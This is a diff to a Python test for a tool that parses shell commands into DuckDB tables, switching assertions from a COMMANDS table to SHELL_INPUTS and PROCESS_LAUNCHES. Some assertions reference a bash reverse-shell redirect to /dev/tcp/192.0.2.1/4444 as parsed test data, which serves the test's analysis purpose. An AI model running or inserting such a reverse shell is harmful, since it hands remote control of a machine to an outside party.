@@ -23,9 +23,12 @@ def records(root, options):
     result = invoke(tmp_path, database, source)
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(database)) as con:
-        rows = {r[0]: r[1:] for r in con.execute("SELECT record_id,pgm,args,shell_input,other_tokens FROM COMMANDS").fetchall()}
-    assert rows["0:shell:0"] == ("ps", ["-ef"], native, ["|", "grep", "stre"])
-    assert rows["1:shell:1"] == ("ls", ["docs a"], inputs[1].split("17 ", 1)[1], ["cd", "..", ";", "X=y", ">", "/dev/null"])
-    assert rows["2:shell:0"][3] == ["|", "cat", "same"]
-    assert rows["3:shell:0"][3] == [">&", "/dev/tcp/192.0.2.1/4444", "0", ">&", "1"]
-    assert rows["native"][2:] == (None, [])
+        shells = {r[0]: r[1:] for r in con.execute("SELECT record_id,shell_input,pgms,tokens FROM SHELL_INPUTS").fetchall()}
+        assert con.execute("SELECT pgm,args FROM PROCESS_LAUNCHES WHERE record_id='native'").fetchone() == ('/bin/sh', ['-c', 'echo x > y'])
+        assert con.execute("SELECT count(*) FROM PROCESS_LAUNCHES").fetchone() == (8,)
+    assert shells["0:shell"][:2] == (native, ['ps', 'grep'])
+    assert shells["1:shell"][:2] == (inputs[1].split("17 ", 1)[1], ['cd', 'ls'])
+    assert shells["2:shell"][2] == ['echo', 'same', 'same', '|', 'cat', 'same']
+    assert shells["3:shell"][1] == ['bash']
+    assert '/dev/tcp/192.0.2.1/4444' in shells["3:shell"][2]
+    assert 'native' not in shells
